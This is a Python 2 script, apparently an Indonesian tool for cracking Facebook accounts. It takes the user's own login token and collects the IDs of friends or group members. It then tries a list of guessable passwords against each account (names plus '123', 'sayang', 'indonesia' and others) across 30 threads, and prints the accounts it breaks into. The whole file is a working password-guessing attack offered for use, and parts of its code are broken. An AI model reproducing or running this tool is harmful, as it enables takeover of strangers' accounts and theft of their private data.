 #!/usr/bin/python2
# coding=utf-8

# -*- coding: utf-8 -*-
#========================
#      AUTHOR : 4njas
#THNKS TO BL4CK DR4G0N

p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')
        
reload(sys)
sys.setdefaultencoding('utf-8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
h = '\x1b[32m'
r = '\x1b[1;91m'
k = '\x1b[1;97m'
n = '\033[94m'
W = "\033[0m"
G = '\033[32;1m'
R = '\033[31;1m'
time.sleep(1)

def keluar():
    print '\x1b[1;97m[!] \x1b[1;91mExit\x1b[1;97m'
    os.sys.exit()
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
		
logo = """\033[1;92m
____ _  _ ___ ____ _  _ ___  ____ 
|__| |  |  |  |  | |\/| |__] |___ 
|  | |__|  |  |__| |  | |__] |                         
         
[ \033[1;93mcσ∂ε вү \033[1;97m4ηנαs ғεαт \033[1;92mвℓ4cк ∂я4g0η ]      
                       \033[1;92m
"""
def tik():
    animation = ' '
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r[!] load Acces token...\x1b[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()
        
back = 0
lol = []
threads= []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman= []
idmem = []
id = []
em = []
emfromteman = []
emmem=[]
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def notice():
	h = '\033[92m'
	k = '\033[93m'
	m = '\033[91m'
	p = '\033[0m'
	from getpass import getpass as oh
	import os
	os.system('clear')
	print m + "		[Warning]\n" + p
	print "Memakai tool bisa membuat akun anda\ncheckpoint atau yg paling parah dibanned.\n"
	print "Silahkan konfirmasi indentitas dahulu\nsebelum memakai tool ini. Segala risiko\nditanggung user. Hiya Hiya Hiya :v\n"
	oh('[Tekan Enter Untuk Lanjut]')
	login()

def loginSC():
	os.system('clear')
	print"\033[1;97m[+]Tools Ini membutuhkan lisensi\n"
	username = raw_input("\033[1;96m[+] \033[1;97musername \033[1;91m: \033[1;92m")
	password = raw_input("\033[1;96m[+] \033[1;97mpassword \033[1;91m: \033[1;92m")
	if username =="anjas" and password =="210":
		print"\033[1;96m[•] \033[1;92mSuccesfuly"
		time.sleep(1)
		login()
	else:
		print"\033[1;96m[!] \033[1;91mSalah!!"
		time.sleep(1)
		Y_T()

def Y_T():
	hee = raw_input("\n\033[1;97mLihat username dan password (y/t) \033[1;91m: \033[1;92m")
	if hee =="":
		print"\033[1;96m[!] \033[1;91mIsi yang benar"
		time.sleep(1)
		os.system('clear')
		Y_T()
	elif hee =="y":
		os.system('clear')
		jalan("\033[1;92mSedang membuka browser")
		os.system('clear')
		os.system('xdg-open https://hokiciki.org/0wQRf')
		time.sleep(1)
		print"Silahkan lihat username dan password di Browser"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]\033[1;92m")
		os.system('clear')
		loginSC()
	elif hee =="t":
		os.system('clear')
		loginSC()
	elif hee =="Y":
		os.system('clear')
		jalan("\033[1;97mSedang membuka browser")
		os.system('clear')
		os.system('xdg-open https://hokiciki.org/0wQRf')
		time.sleep(1)
		print"Silahkan lihat username dan password di Browser"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]\033[1;92m")
		os.system('clear')
		loginSC()
	elif hee =="T":
		os.system('clear')
		loginSC()
	else:
		print"\033[1;96m[!] \033[1;91mIsi yang benar"
		time.sleep(1)
		os.system('clear')
		Y_T()
	
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print'[•] LOGIN ACCOUNT FACEBOOK [•]'
		id = raw_input('[+] \033[1;97musername : ')
		pwd = raw_input('\033[1;92m[\033[1;92m+\033[1;92m] \033[1;97mPassword : ')
		
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91midupin Data nya Goblok!"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				anjas = open("login.txt", 'w')
				anjas.write(z['access_token'])
				anjas.close()
				time.sleep(1)
				print '\n[+] succesfuly\n'
				os.system('')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mIdupin datanya Njir"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			

def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken No deceted !!"
		os.system('rm -rf login.txt')  
		time.sleep(1)
		keluar()
	os.system("clear")
	print logo
	print " "
	print( "\x1b[1;97m1). from friend list")
	print( "\x1b[1;97m2). from friend")
	print( "\x1b[1;97m3). from members grup")
	print( "\x1b[1;97m4). from list id")
	print "\n\x1b[1;91m0). exit "
	peak = raw_input("\n\033[1;97m[?] Pilih_> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		menu()
	elif peak =="1":
		
		jalan('\033[1;97m[#] \033[1;97mGetting friend id\033[1;97m ...')
		time.sleep(3)
		print '[#] succes Getting friend id'
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		print 42 * '\x1b[1;97m\xe2\x95\x90'
		idt = raw_input("\033[1;97m[#] \033[1;97mInput id friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":

		idg=raw_input('\033[1;96m[#] \033[1;92mID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
                 
		list = raw_input('\033[36m[#] \033[1;97mMasukan List id \033[1;91m:\033[1;97m')
		try:
			t = open(list,'r').readlines()
			print "\033[1;92m[!] List Di Temukan "
		except IOError:
			print "\033[31m[-] List Tidak Di Temukan"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
                        menu()
		for b in t:
			id.append(b)
	elif peak =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih_menu()
	
	print "\033[1;97m[#] \033[1;97mTotal \033[1;91m: \033[1;97m"+str(len(id))
	
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r[#] \x1b[1;97mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
        print " "
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			#Pass1
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print("\033[1;92m[\033[1;92m+\033[1;92m]\033[1;97m "+user+" => " +pass1)
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m '+user + ' => ' + pass1
				else:
					#Pass2
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print("\033[1;92m[\033[1;92m+\033[1;92m]\033[1;97m "+user+" => " +pass2)
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m '+user + ' => ' + pass2 
						else:
							#Pass3
							pass3 = b['last_name']+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;92m[\033[1;92m+\033[1;92m]\033[1;97m "+user+" => " +pass3)
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m '+user + ' => ' + pass3
								else:
									#Pass4
									pass4 = 'sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;92m[\033[1;92m+\033[1;92m]\033[1;97m "+user+" => " +pass4)
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m '+user + ' => ' + pass4
										else:
											#Pass5
											pass5 = b['first_name']+'ganteng'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;92m[\033[1;92m+\033[1;92m]\033[1;97m "+user+" => " +pass5)
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m '+user + ' => ' + pass5
												else:
													#Pass6
													pass6 = "indonesia"
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print("\033[1;92m[\033[1;92m+\033[1;92m]\033[1;97m "+user+" => " +pass6)
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m '+user + ' => ' + pass6
														else:
															#Pass7
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'anjing'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print("\033[1;92m[\033[1;92m+\033[1;92m]\033[1;97m "+user+" => " +pass7)
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m '+user+ ' => ' + pass7
					
																else:
																
                                                                                                                                        #Pass8
                                                                                                                                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
                                                                                                                                         b = json.loads(a.text)
                                                                                                                                         pass8 = 'ganteng'
                                                                                                                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                         q = json.load(data)
                                                                                                                                         if 'access_token' in q:
                                                                                                                                                 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                                                                                                                 z = json.loads(x.text)
                                                                                                                                                 print("\033[1;97m[\033[1;92m+\033[1;97m] "+user+" => " +pass8)
                                                                                                                                                 oks.append(user+pass8)
                                                                                                                                       
                                                                                                                                                      						
															
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print' '
	print '[+] Program Finished !'
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu()

login()